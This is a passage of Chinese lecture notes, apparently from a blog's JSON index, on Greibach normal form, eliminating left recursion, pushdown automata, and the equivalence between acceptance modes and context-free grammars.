&\\to C_aBB \\vert C_bS \\vert C_b\n\\end{aligned}</script><p>其中不满足CNF的只有$A \\to C_bAA$和$B \\to C_aBB$，替换得到：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA &\\to C_bD_1 \\\\\nD_1 &\\to AA \\\\\nB &\\to C_aD_2 \\\\\nD_2 &\\to BB\n\\end{aligned}</script><h4 id=\"GNF\"><a href=\"#GNF\" class=\"headerlink\" title=\"GNF\"></a>GNF</h4><p><strong>定理</strong>：每个不带$\\epsilon$的CFL都可以这样的CFG $G$定义，$G$中每个产生式的形式都为</p>\n<script type=\"math/tex; mode=display\">\nA \\to a\\alpha</script><p>其中$A$是变元，$a$是终结符，$\\alpha$是零或多个变元的串</p>\n<ul>\n<li>GNF每个产生式都会引入一个 终结符</li>\n<li>长度为$n$的串的派生恰好是$n$步</li>\n</ul>\n<p>例：将以下文法转化为GNF</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to AB \\\\\nA &\\to aA \\vert bB \\vert b \\\\\nB &\\to b\n\\end{aligned}</script><p>因为$A$,$B$的产生式已经是符合GNF文法的，因此，直接用$A$产生式替换$S$的产生式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to aAB \\vert bBB \\vert bB \\\\\nA &\\to aA \\vert bB \\vert b \\\\\nB &\\to b\n\\end{aligned}</script><p><strong>定义</strong>：文法中形式为$A \\to A\\alpha$的产生式，称为<strong>直接左递归</strong></p>\n<p>一般直接坐递归的变元如果是“产生的”，一般是如下定义：</p>\n<script type=\"math/tex; mode=display\">\nA \\to A\\alpha \\vert \\beta</script><p>这种产生式，可以推出</p>\n<script type=\"math/tex; mode=display\">\nA \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} A \\alpha^n \\underset{}{\\stackrel{}{\\Rightarrow}} \\beta \\alpha^n</script><p>为了消除直接左递归，可以定义$A$的产生式为：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA &\\to \\beta \\vert \\beta B \\\\\nB &\\to \\alpha \\vert \\alpha B\n\\end{aligned}</script><p>消除直接左递归：</p>\n<ul>\n<li>若$A$产生式<script type=\"math/tex; mode=display\">\nA \\to A \\alpha_1 \\vert A \\alpha_2 \\vert \\dots \\vert A \\alpha_n \\vert \\beta_1 \\vert \\beta_2 \\vert \\dots \\vert \\beta_m</script>其中$\\alpha_i \\not= \\epsilon$，$\\beta_j$不以$A$开始<ul>\n<li>引入新变元$B$，并用如下产生式替换<script type=\"math/tex; mode=display\">\nA \\to \\beta_1 \\vert \\beta_2 \\vert \\dots \\vert \\beta_m \\vert \\beta_1B \\vert \\beta_2B \\vert \\dots \\vert \\beta_mB \\\\\nB \\to \\alpha_i \\vert \\alpha_2 \\vert \\dots \\vert \\alpha_n \\vert \\alpha_1B \\vert \\alpha_2B \\vert \\dots \\vert \\alpha_nB</script></li>\n</ul>\n</li>\n</ul>\n<p><strong>定义</strong>：如果文法中由形式为</p>\n<script type=\"math/tex; mode=display\">\nA \\to B\\alpha \\vert \\dots \\\\\nB \\to A\\beta \\vert \\dots</script><p>的产生式，称为间接左递归</p>\n<ul>\n<li>会有$A \\Rightarrow B\\alpha \\Rightarrow A\\beta\\alpha$，无法通过代换消除递归</li>\n</ul>\n<p>消除间接左递归</p>\n<ul>\n<li>将文法中变元重命名为$A_1,A_2,\\dots,A_n$</li>\n<li>通过代入，使产生式都形如<script type=\"math/tex; mode=display\">\nA_i \\to A_j \\alpha \\\\\nA_i \\to a \\alpha</script>但要求$i \\leq j$ </li>\n<li>消除直接左递归$A_i \\to A_i\\beta$，再代入其他产生式</li>\n</ul>\n<p>例：将下列文法转化成GNF</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to AB \\\\\nA &\\to BS \\vert b \\\\\nB &\\to SA \\vert a \\\\\n\\end{aligned}</script><p>先消除间接左递归，对所有变元标号：</p>\n<script type=\"math/tex; mode=display\">\nS = A_1 \\ A = A_3 \\ B = A_3 \\</script><p>重新代入产生式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA_1 &\\to A_2A_3 \\\\\nA_2 &\\to A_3A_1 \\vert b \\\\\nA_3 &\\to A_1A_2 \\vert a\n\\end{aligned}</script><p>检查$A_i \\to A_j \\alpha$中$i \\leq j$，其中$A_3 \\to A_1A_2 \\vert a$不满足，所以带入$A_1$的产生式，变为$A_3 \\to A_2A_3A_2 \\vert a$，此时依然不满足$i \\leq j$，继续代入$A_2$产生式，得到</p>\n<script type=\"math/tex; mode=display\">\nA_3 \\to A_3A_1A_3A_2 \\vert bA_3A_2 \\vert a</script><p>此时$A_3$出现了直接左递归，利用消除直接左递归公式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n\\alpha &= A_1A_3A_2 \\\\\n\\beta_1 &= bA_3A_2 \\\\\n\\beta_2 &= a \\\\\n\\end{aligned}</script><p>$A_3$代入到$A_2$，$A_2$代入到$A_1$，$A_1$导入到$B_1$，消除直接左递归后的产生式：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nA_3 &\\to bA_3A_2 \\vert a \\vert bA_3A_2B_1 \\vert aB_1 \\\\\nB_1 &\\to bA_3A_2A_1A_3A_3A_2 \\vert aA_1A_3A_3A_2 \\vert bA_3A_2B_1A_1A_3A_3A_2 \\vert aB_1A_1A_3A_3A_2 \\\\\n &\\vert bA_3A_3A_2 \\vert bA_3A_2A_1A_3A_3A_2B_1 \\vert aA_1A_3A_2B_1 \\vert bA_3A_2B_1A_1A_3A_3A_2B_1  \\\\\n &\\vert aB_1A_1A_3A_3A_2B_1 \\vert bA_3A_3A_2B_1  \\\\\nA_2 &\\to bA_3A_2A_1 \\vert aA_1 \\vert bA_3A_2B_1A_1 \\vert aB_1A_1 \\vert b\\\\\nA_1 &\\to bA_3A_2A_1A_3 \\vert aA_1A_3 \\vert bA_3A_2B_1A_1A_3 \\vert aB_1A_1A_3 \\vert bA_3\n\\end{aligned}</script>","categories":["形式语言与自动机理论"],"tags":["形式语言与自动机理论"]},{"title":"形式语言与自动机理论（4）下推自动机","url":"/2021/02/01/%E5%BD%A2%E5%BC%8F%E8%AF%AD%E8%A8%80%E4%B8%8E%E8%87%AA%E5%8A%A8%E6%9C%BA%E7%90%86%E8%AE%BA%EF%BC%884%EF%BC%89%E4%B8%8B%E6%8E%A8%E8%87%AA%E5%8A%A8%E6%9C%BA/","content":"<h2 id=\"下推自动机\"><a href=\"#下推自动机\" class=\"headerlink\" title=\"下推自动机\"></a>下推自动机</h2><p><img src=\"76.png\" alt=\"\"><br>一个下推自动机和一个$\\epsilon$-NFA类似，拥有一个无限长的输入带，一个有穷状态控制器，一个读头。同时具有$\\epsilon$-NFA的特性：</p>\n<ul>\n<li>有限状态</li>\n<li>非确定</li>\n<li>$\\epsilon$转移<br>与之不同的是，下推自动机增加一个符号栈，符号栈有一个读写头，读写的时候后进先出，只用栈顶，栈长度无限。</li>\n<li>$pop$：仅仅弹出栈顶一个符号</li>\n<li>$push$：可压入一个符号<strong>串</strong></li>\n</ul>\n<p>读头从输入带上一次读入一个字符，并向右移动一个单位长度，控制符号栈读头弹出一个符号。有穷控制器根据读入的字符，弹出的栈顶符号以及当前的状态，修改当前状态，并向符号栈压入一个新串。</p>\n<blockquote>\n<p>下推自动机能识别的语言比有穷自动机更多<br><span id=\"more\"></span></p>\n</blockquote>\n<h3 id=\"形式定义\"><a href=\"#形式定义\" class=\"headerlink\" title=\"形式定义\"></a>形式定义</h3><p>下推自动机（PDA，Pushdown Automata），$P$为七元组</p>\n<script type=\"math/tex; mode=display\">\nP=(Q,\\Sigma,\\Gamma,\\delta,q_0,Z_0,F)</script><ul>\n<li>$Q$：有穷状态集</li>\n<li>$\\Sigma$：有穷输入符号集</li>\n<li>$\\Gamma$：有穷栈符号集</li>\n<li>$\\delta:Q \\times (\\Sigma \\cup \\lbrace \\epsilon \\rbrace) \\times \\Gamma \\to 2^{Q \\times \\Gamma^{\\ast}}$：状态转移函数</li>\n<li>$q_0 \\in Q$：初始状态</li>\n<li>$Z_0 \\in \\Gamma - \\Sigma$：栈底符号</li>\n<li>$F \\subseteq Q$：接受状态集或终态集</li>\n</ul>\n<p>如果$q,p_i \\in Q(1 \\leq i \\leq m)$，$a \\in \\Sigma$，$Z \\in \\Gamma$，$\\beta_i \\in \\Gamma^{\\ast}$，可以有动作</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q,a,Z) = \\lbrace (p_1,\\beta_1),(p_2,\\beta_2),\\dots,(p_m,\\beta_m) \\rbrace</script><p>或</p>\n<script type=\"math/tex; mode=display\">\n\\delta(q,\\epsilon,Z) = \\lbrace (p_1,\\beta_1),(p_2,\\beta_2),\\dots,(p_m,\\beta_m) \\rbrace</script><p>对于状态为$q$的情况，接受一个字符$a$或者$\\epsilon$，当栈顶为$Z$时，弹出$Z$，接下来可以压入串$\\beta_i$，并跳到状态$p_i$；也可以压入串$\\beta_j$，并跳到状态$p_j$，对应的状态转移图如下：<br><img src=\"77.png\" alt=\"\"></p>\n<p>例1：设计识别$L_{01}=\\lbrace 0^n1^n \\vert n \\geq 1 \\rbrace$的PDA。</p>\n<p>正则语言不能表示的语言，PDA可以表达。当读入0的时候，把0都压入栈中；当读入1时，弹出一个0。当读完最后一个符号，如果正好栈置0，可以通过空转移跳转到接受状态。为此引入一个栈底符号$Z_0$，它事先存在于栈中。<br><img src=\"78.png\" alt=\"\"><br>一开始，状态为$q_0$时对应接受0的状态，当栈顶是$Z_0$和0时压入一个0。当读到1且栈顶为0，就跳转到$q_1$准备接受1，此后每次读1都出栈一个0。如果串合法，读完后栈顶是$Z_0$，此时通过空转移跳转到接受状态。</p>\n<p>例2：设计识别$L_{wwr} = \\lbrace ww^R \\vert w \\in (0+1)^{\\ast} \\rbrace$</p>\n<p>即识别01构成的回文串。在读$w$的时候压栈，读$w^R$时出栈，则出栈的符号和读入的符号相同。具体流程是：在读$w$时候对应$q_0$，无论栈顶是什么，都仅把读入的压栈，两种读入，三种栈顶情况，一共考虑六种可能。读完$w$后，通过$\\epsilon$-转移转移到$q_1$开始读$w^R$，考虑三种栈顶可能。在$q_1$状态时吗，读入和栈顶相等时，只弹出。当读完$ww^R$，栈顶变为$Z_0$，通过空转移跳转到接收状态。<br><img src=\"79.png\" alt=\"\"></p>\n<h3 id=\"瞬时描述和转移符号\"><a href=\"#瞬时描述和转移符号\" class=\"headerlink\" title=\"瞬时描述和转移符号\"></a>瞬时描述和转移符号</h3><p><strong>定义</strong>：为描述PDA瞬间的格局，定义$Q \\times \\Sigma^{\\ast} \\times \\Gamma^{\\ast}$中三元组$(q,w,\\gamma)$为瞬时描述（ID，Instananeous Description），表示此时PDA处于状态$q$，剩余输入串$w$，栈中当前全部符号为$\\gamma$<br><img src=\"80.png\" alt=\"\"></p>\n<p><strong>定义</strong>：在PDA $P$中如果$(p,\\beta) \\in \\delta(q,a,Z)$，由$(q,aw,Z\\alpha)$到$(p,w,\\beta\\alpha)$，称为$ID$的转移$\\vdash_P$，记为</p>\n<script type=\"math/tex; mode=display\">\n(q,aw,Z\\alpha) ⊢_P (p,w,\\beta\\alpha)</script><p>其中$w \\in \\Sigma^{\\ast}, \\ \\alpha \\in \\Gamma^{\\ast}$<br>若有$ID \\ I,J,K$，递归定义$\\vdash_P^{\\ast}$为：</p>\n<ul>\n<li>$I \\vdash_P^{\\ast} I$</li>\n<li>若$I \\vdash_P^{\\ast} J,\\ J \\vdash_P^{\\ast} K$，则$I \\vdash_P^{\\ast} K$</li>\n</ul>\n<p>若$P$已知，可省略，记为$\\vdash$和$\\vdash^{\\ast}$</p>\n<p>续例：语言$L_{01} = \\lbrace 0^n1^n \\vert n \\geq 1 \\rbrace$的PDA，识别0011时的$ID$序列。<br><img src=\"78.png\" alt=\"\"></p>\n<script type=\"math/tex; mode=display\">\n(q_0,0011,Z_0) \\vdash (q_0,011,0Z_0) \\vdash (q_0,11,00Z_0) \\vdash (q_1,1,0Z_0) \\vdash (q_1,\\epsilon,Z_0) \\vdash (q_2,\\epsilon,Z_0)</script><p><strong>定理23</strong>：对$\\forall w \\in \\Sigma^{\\ast}, \\forall \\gamma \\in \\Gamma^{\\ast}$，如果</p>\n<script type=\"math/tex; mode=display\">\n(q,x,\\alpha) \\vdash_P^{\\ast} (p,y,\\beta)</script><p>那么</p>\n<script type=\"math/tex; mode=display\">\n(q,xw,\\alpha\\gamma) \\vdash_P^{\\ast} (p,yw,\\beta\\gamma)</script><p>即：“输入串后加一个$w$，栈后面加一个$\\gamma$，$ID$依然可以转移”，原因是PDA没有用到输入串$x$之后的部分$w$和栈$\\beta$后的部分$\\gamma$<br><img src=\"76.png\" alt=\"\"></p>\n<p><strong>定理24</strong>：<br>对$\\forall w \\in \\Sigma^{\\ast}$，如果</p>\n<script type=\"math/tex; mode=display\">\n(q,xw,\\alpha) \\vdash_P^{\\ast} (p,yw,\\beta)</script><p>那么</p>\n<script type=\"math/tex; mode=display\">\n(q,x,\\alpha) \\vdash_P^{\\ast} (p,y,\\beta)</script><p>因为转移过程输入串没有用到$w$，所以可以删掉。</p>\n<blockquote>\n<p>注意对栈不实用删除$w$</p>\n</blockquote>\n<h2 id=\"下推自动机接受的语言\"><a href=\"#下推自动机接受的语言\" class=\"headerlink\" title=\"下推自动机接受的语言\"></a>下推自动机接受的语言</h2><p><strong>定义</strong>：PDA $P=(Q,\\Sigma,\\Gamma,\\delta,q_0,Z_0,F)$</p>\n<ul>\n<li>$P$以终态方式接受的语言，记为$\\boldsymbol{L}(P)$，定义为<script type=\"math/tex; mode=display\">\n\\boldsymbol{L}(P) = \\lbrace w \\vert (q_0,w,Z_0) \\vdash^{\\ast} (p,\\epsilon,\\gamma), p \\in F \\rbrace</script></li>\n<li>以空栈方式接受的语言，记为$\\boldsymbol{N}(P)$，定义为<script type=\"math/tex; mode=display\">\n\\boldsymbol{N}(P) = \\lbrace w \\vert (q_0,w,Z_0) \\vdash^{\\ast} (p,\\epsilon,\\epsilon) \\rbrace</script></li>\n</ul>\n<p>续例2：识别$L_{wwr} = \\lbrace ww^R \\vert w \\in (0+1)^{\\ast} \\rbrace$ 的PDA $P$，从终态方式接受，改为空栈方式接受。<br><img src=\"79.png\" alt=\"\"><br>用$\\delta(q_1,\\epsilon,Z_0)=\\lbrace(q_1,\\epsilon) \\rbrace$代替$\\delta(q_1,\\epsilon,Z_0)=\\lbrace (q_2,Z_0)\\rbrace$即可。<br><img src=\"81.png\" alt=\"\"></p>\n<h3 id=\"从终态方式到空栈方式\"><a href=\"#从终态方式到空栈方式\" class=\"headerlink\" title=\"从终态方式到空栈方式\"></a>从终态方式到空栈方式</h3><p><strong>定理25</strong>：如果PDA $P_F$以终态方式接受语言$L$，那么一定存在PDA $P_N$以空栈方式接受$L</p>\n<p><strong>证明</strong>：设$P_F=(Q,\\Sigma, \\Gamma,\\delta_F,q_0,Z_0,F)$，构造PDA $P_N$<br>模拟$P_F$</p>\n<script type=\"math/tex; mode=display\">\nP_N=(Q \\cup \\lbrace p_0,p \\rbrace, \\Sigma, \\Gamma \\cup \\lbrace X_0 \\rbrace, \\delta_N, p_0, X_0, \\emptyset )</script><p>增加一个状态$p<em>0$，用$\\epsilon$转移把$P_F$的栈底符压入栈中，然后让$P_F$去接受他该接受的字符串，当完成字符串读取，他的状态会落入到某一个接受状态中（例如$q</em>{f<em>i}$或$q</em>{f_j}$），再利用空转移，再利用$\\epsilon$转移将栈中符号弹出，跳转到$p$，再$p$中再利用空转移，将栈中符号全部弹出，栈空。即：如果一个串可以被$P_F$接受，那么也一定可以再$p$状态被$P_F$以空栈方式接受。<br><img src=\"82.png\" alt=\"\"><br>由于大部分都是模拟$P_F$，所以其中的$\\delta_N$大部分是$P_F$的状态转移函数。$\\delta_N$的定义如下：</p>\n<ul>\n<li>$P_N$首先将$P_F$的栈底符号压栈，开始模拟$P_F$：<script type=\"math/tex; mode=display\">\n\\delta_N(p_0,\\epsilon,X_0)=\\lbrace (q_0,Z_0X_0) \\rbrace</script></li>\n<li>$P_N$模拟$P_F$的动作：$\\forall q \\in Q, \\ \\forall a \\in \\Sigma \\cup \\lbrace \\epsilon \\rbrace,\\ \\forall Y \\in \\Gamma$<script type=\"math/tex; mode=display\">\n\\delta_N(q,a,Y) \\text{包含} \\delta_F(q,a,Y) \\text{的全部元素}</script></li>\n<li>从$q_f \\in F$开始弹出栈中符号，即$\\forall q_f \\in F,\\forall Y \\in \\Gamma \\cup \\lbrace X_0 \\rbrace$<script type=\"math/tex; mode=display\">\n\\delta_N(q_f,\\epsilon,Y) \\text{包含} (p,\\epsilon)</script></li>\n<li>在状态$p$时，弹出全部栈中符号，即$\\forall Y \\in \\Gamma \\cup \\lbrace X_0 \\rbrace$<script type=\"math/tex; mode=display\">\n\\delta_N(p,\\epsilon,Y) = \\lbrace (p,\\epsilon) \\rbrace</script></li>\n</ul>\n<p>接下来证明构造的正确性。对于$\\forall w \\in \\Sigma^{\\ast}$有：</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nw \\in \\boldsymbol{L}(P_F) &\\Rightarrow (q_0,w,Z_0) \\vdash_{P_F}^{\\ast}(q_f,\\epsilon,\\gamma) \\\\\n&\\Rightarrow(q_0,w,Z_0 X_0) \\vdash_{P_F}^{\\ast} (q_f,\\epsilon,\\gamma X_0) \\\\\n&\\Rightarrow (q_0,w,Z_0 X_0) \\vdash_{P_N}^{\\ast} (q_f,\\epsilon,\\gamma X_0) \\\\\n&\\Rightarrow (p_0,w,X_0) \\vdash_{P_N}^{\\ast} (q_0,w,Z_0X_0) \\vdash_{P_N}^{\\ast} (q_f,\\epsilon,\\gamma X_0) \\\\\n&\\Rightarrow(p_0,w,X_0) \\vdash_{P_N}^{\\ast} (q_f,\\epsilon,\\gamma X_0) \\vdash_{P_N}^{\\ast} (p,\\epsilon, \\epsilon) \\\\\n&\\Rightarrow w \\in \\boldsymbol{L}(P_N)\n\\end{aligned}</script><p>即$\\boldsymbol{N}(P_F) \\subseteq \\boldsymbol{L}(P_N)$<br>对$\\forall w \\in \\Sigma^{\\ast}$有</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nw \\in \\boldsymbol{L}(P_N) &\\Rightarrow (p_0,w,X_0) \\vdash_{P_N}^{\\ast}(p,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow(p_0,w,X_0) \\vdash_{P_N}^{\\ast} (q_0,w,Z_0 X_0) \\vdash_{P_N}^{\\ast} (p,\\epsilon,\\epsilon)\\\\\n&\\Rightarrow(q_0,w,Z_0 X_0) \\vdash_{P_N}^{\\ast} (q_f,\\epsilon,\\gamma X_0) \\vdash_{P_N}^{\\ast} (p,\\epsilon,\\epsilon)\\\\\n&\\Rightarrow (q_0,w,Z_0) \\vdash_{P_N}^{\\ast} (q_f,\\epsilon,\\gamma) \\\\\n&\\Rightarrow (q_0,w,Z_0) \\vdash_{P_F}^{\\ast} (q_f,\\epsilon,\\gamma)\\\\\n&\\Rightarrow w \\in \\boldsymbol{L}(P_F)\n\\end{aligned}</script><p>即$\\boldsymbol{N}(P_N) \\subseteq \\boldsymbol{L}(P_F)$，所以$\\boldsymbol{N}(P_N) = \\boldsymbol{L}(P_F)$</p>\n<h3 id=\"从空栈方式到终态方式\"><a href=\"#从空栈方式到终态方式\" class=\"headerlink\" title=\"从空栈方式到终态方式\"></a>从空栈方式到终态方式</h3><p><strong>定理26</strong>：如果PDA $P_N$以空栈方式接受语言$L$，那么一定存在PDA $P_F$以以终态方式接受$L$</p>\n<p><strong>证明</strong>：设$P_N= (Q,\\Sigma,\\Gamma,\\delta_N,q_0,Z_0,\\emptyset)$，构造PDA $P_F$</p>\n<script type=\"math/tex; mode=display\">\nP_F = (Q \\cup \\lbrace p_0, p_f \\rbrace,\\Sigma,\\Gamma \\cup \\lbrace X_0 \\rbrace,\\delta_F,p_0,X_0,\\lbrace p_f \\rbrace)</script><p><img src=\"83.png\" alt=\"\"><br>其中$\\delta_F$定义如下：</p>\n<ul>\n<li>$P_F$开始时，将$P_N$栈底符号压入栈，并开始模拟$P_N$<script type=\"math/tex; mode=display\">\n\\delta_F(p_0, \\epsilon, X_0) = \\lbrace (q_0,Z_0X_0) \\rbrace</script><ul>\n<li>$P_F$模拟$P_N$，$\\forall q \\in Q,\\ \\forall a \\in \\Sigma \\cup \\lbrace \\epsilon \\rbrace, \\ \\forall Y \\in \\Gamma$:<script type=\"math/tex; mode=display\">\n\\delta_F(q,a,Y) = \\delta_N(q,a,Y)</script></li>\n</ul>\n</li>\n<li>在$\\forall q \\in Q$时，看到$P_F$的栈底$X_0$，则转移到新终态$p_f$：<script type=\"math/tex; mode=display\">\n\\delta_F(q,\\epsilon,X_0)=\\lbrace (p_f,\\epsilon) \\rbrace</script></li>\n</ul>\n<p>对$\\forall w \\in \\Sigma^{\\ast}$有</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nw \\in \\boldsymbol{N}(P_N) &\\Rightarrow (q_0,w,Z_0) \\vdash_{P_N}^{\\ast} (q,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow (q_0,w,Z_0 X_0) \\vdash_{P_N}^{\\ast} (q,\\epsilon,X_0) \\\\\n&\\Rightarrow (q_0,w,Z_0 X_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,X_0) \\\\\n&\\Rightarrow (q_0,w,X_0) \\vdash_{P_F} (q_0,w,Z_0 X_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,X_0) \\\\\n&\\Rightarrow (q_0,w,X_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,X_0) \\vdash_{P_F} (p_f,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow (p_0,w,X_0) \\vdash_{P_F}^{\\ast} (p_f,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow w \\in \\boldsymbol{L}(P_F)\n\\end{aligned}</script><p>即$\\boldsymbol{N}(P_N) \\subseteq \\boldsymbol{L}(P_F)$<br>对$\\forall w \\in \\Sigma^{\\ast}$有</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nw \\in \\boldsymbol{L}(P_F) &\\Rightarrow (p_0,w,X_0) \\vdash_{P_F}^{\\ast} (p_f,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow (p_0,w,X_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,X_0) \\vdash_{P_F} (p_f,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow(p_0,w,X_0) \\vdash_{P_F} (q_0,w,Z_0 X_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,X_0) \\\\\n&\\Rightarrow (q_0,w,Z_0 X_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,X_0) \\\\\n&\\Rightarrow (q_0,w,Z_0) \\vdash_{P_F}^{\\ast} (q,\\epsilon,\\epsilon) \\\\\n&\\Rightarrow w \\in \\boldsymbol{N}(P_N)\n\\end{aligned}</script><p>即$\\boldsymbol{N}(P_F) \\subseteq \\boldsymbol{L}(P_N)$，所以$\\boldsymbol{L}(P_F) = \\boldsymbol{N}(P_N)$</p>\n<p>例3：接受$L=\\lbrace 0,1 \\rbrace^{\\ast} \\vert w \\text{中字符0和1的数量相同} \\rbrace$的PDA<br><img src=\"84.png\" alt=\"\"></p>\n<p>例4：接受$L=\\lbrace 0^n1^m \\vert 0 \\leq n \\leq m \\leq 2n \\rbrace$的PDA<br><img src=\"85.png\" alt=\"\"></p>\n<h2 id=\"下推自动机与文法的等价性\"><a href=\"#下推自动机与文法的等价性\" class=\"headerlink\" title=\"下推自动机与文法的等价性\"></a>下推自动机与文法的等价性</h2><h3 id=\"由CFG到PDA\"><a href=\"#由CFG到PDA\" class=\"headerlink\" title=\"由CFG到PDA\"></a>由CFG到PDA</h3><p>例5：设计语言$L=\\lbrace 0^n1^m \\vert 1 \\leq m \\leq n \\rbrace$的PDA<br><img src=\"86.png\" alt=\"\"></p>\n<p>续例5：设计语言$L=\\lbrace 0^n1^m \\vert 1 \\leq m \\leq n \\rbrace$的CFG</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\nS &\\to AB \\\\\nA &\\to 0A \\vert \\epsilon \\\\\nB &\\to 0B1 \\vert 01\n\\end{aligned}</script><p>字符串00011的最左派生：</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{lm}{\\Rightarrow} AB \\underset{lm}{\\Rightarrow} 0AB \\underset{lm}{\\Rightarrow} 0B \\underset{lm}{\\Rightarrow} 00B1 \\underset{lm}{\\Rightarrow} 00011</script><p>续例5：语言$L=\\lbrace 0^n1^m \\vert 1 \\leq m \\leq n \\rbrace$</p>\n<p>用PDA栈顶符号的替换，模拟文法的最左派生<br><img src=\"87.png\" alt=\"\"></p>\n<p>续例5：语言$L=\\lbrace 0^n1^m \\vert 1 \\leq m \\leq n \\rbrace$<br><img src=\"88.png\" alt=\"\"></p>\n<p><strong>定理27</strong>：任何CFL $L$，一定存在PDA $P$，使$L=\\boldsymbol{N}(P)$</p>\n<p><strong>构造与文法等价的PDA</strong><br>如果CFG $G= (V,T,P^{\\prime},S)$，构造PDA</p>\n<script type=\"math/tex; mode=display\">\nP=(\\lbrace q \\rbrace,T,V \\cup T,\\delta,q,S,\\emptyset)</script><p>其中$\\delta$为：</p>\n<ul>\n<li>$\\forall A \\in V$：<script type=\"math/tex; mode=display\">\n\\delta(q,\\epsilon,A) = \\lbrace (q,\\beta) \\vert A \\to \\beta \\in P^{\\prime} \\rbrace</script></li>\n<li>$\\forall a \\in T$：<script type=\"math/tex; mode=display\">\n\\delta(q,a,a) = \\lbrace (q,\\epsilon) \\rbrace</script>那么$\\boldsymbol{L}(G) = \\boldsymbol{N}(P)$</li>\n</ul>\n<p>例6：为文法$S \\to aAA,\\ A \\to aA \\vert bS \\vert a$，构造PDA<br><img src=\"89.png\" alt=\"\"></p>\n<p>证明：往证</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} w \\Leftrightarrow (q,w,S) \\vdash_P^{\\ast} (q,\\epsilon,\\epsilon)</script><p>【充分性】往证</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} w \\Leftrightarrow (q,w,S) \\vdash^{\\ast} (q,\\epsilon,\\epsilon)</script><p>设$S \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} w$中第$i$个左句型为$x_iA_i\\alpha_i$，其中$x_i \\in \\Sigma^{\\ast},A_i \\in V,\\alpha_i \\in (V \\cup T)^{\\ast}$。并将$S$看作第0个左句型$x_0A_0\\alpha_0=S$，那么</p>\n<script type=\"math/tex; mode=display\">\nx_0 = \\epsilon,A_0 = S,\\alpha_0 = \\epsilon</script><p>将$w$看作第$n$个左句型$x_nA_n\\alpha_n=w$，那么</p>\n<script type=\"math/tex; mode=display\">\nx_n = w,A_n=\\epsilon,\\alpha_n = \\epsilon</script><p>再对派生步骤$i$归证，往证</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} x_iA_i\\alpha_i \\land w = x_iy_i \\Rightarrow (q,w,S) \\vdash^{\\ast} (q,y_i,A_i\\alpha_i)</script><p>归纳基础：当左派生要0步时，显然成立</p>\n<script type=\"math/tex; mode=display\">\n(q,w,S) \\vdash^{\\ast} (q,y_0,A_0\\alpha_0)=(q,w,S)</script><p>归纳递推：假设$i$步时上式成立，当第$i+1$步时，一定是$A_i \\to \\beta$应用到$x_iA_i\\alpha_i$</p>\n<script type=\"math/tex; mode=display\">\nS \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} x_iA_i\\alpha_i \\underset{lm}{\\stackrel{}{\\Rightarrow}} x_i\\beta\\alpha_i = x_{i+1}A_{i+1}\\alpha_{i+1}</script><p>变元$A<em>{i+1}$一定再$\\beta\\alpha_i$中，设$A</em>{i+1}$之前的终结符为$x^{\\prime}$，则有</p>\n<script type=\"math/tex; mode=display\">\n\\beta\\alpha_i = x^{\\prime}A_{i+1}\\alpha_{i+1}</script><p>又因为$w=x<em>iy_i=x_ix^{\\prime}y</em>{i+1}=x<em>{i+1}y</em>{i+1}$，所以有</p>\n<script type=\"math/tex; mode=display\">\ny_i = x^{\\prime}y_{i+1}</script><p>那么，再PDA中从ID $(q,y_i,A_i\\alpha_i)$模拟最左派生，用产生式$A_i \\to \\beta$替换栈顶$A_i$后，有</p>\n<script type=\"math/tex; mode=display\">\n\\begin{aligned}\n(q,w,S) &\\vdash^{\\ast} (q,y_i,A_i\\alpha_i) \\\\\n&\\vdash (q,y_i,\\beta\\alpha_i) \\\\\n&= (q,x^{\\prime}y_{i+1},x^{\\prime}A_{i+1}\\alpha_{i+1}) \\\\\n&\\vdash^{\\ast} (q,y_{i+1},A_{i+1}\\alpha_{i+1})\n\\end{aligned}</script><p>因此$S \\underset{lm}{\\stackrel{\\ast}{\\Rightarrow}} w \\Rightarrow (q,w,S) \\vdash^{\\ast} (q,y_n,A_n\\alpha_n)=(q,\\epsilon,\\epsilon)$，即充分性得证。</p>\n<p>【必要性】往证更一般的，对任何变元$A$，都有：</p>\n<script type=\"math/tex; mode=display\">\n(q,x,A) \\vdash^{\\ast} (q,\\epsilon,\\epsilon) \\Longrightarrow A \\underset{}{\\stackrel{\\ast}{\\Rightarrow}} x</script><p>可以看作“从输入带中消耗掉$x$”与“从栈中弹出$A$”两种作用相互抵消。对ID转移$(q,x,A) \\vdash^i (q,\\epsilon,\\epsilon)$的次数$i$归纳证明。</p>\n<p>归纳基础：当$i=1$次时，只能是$x=\\epsilon$且$A \\to \\epsilon$为产生式，所以$A 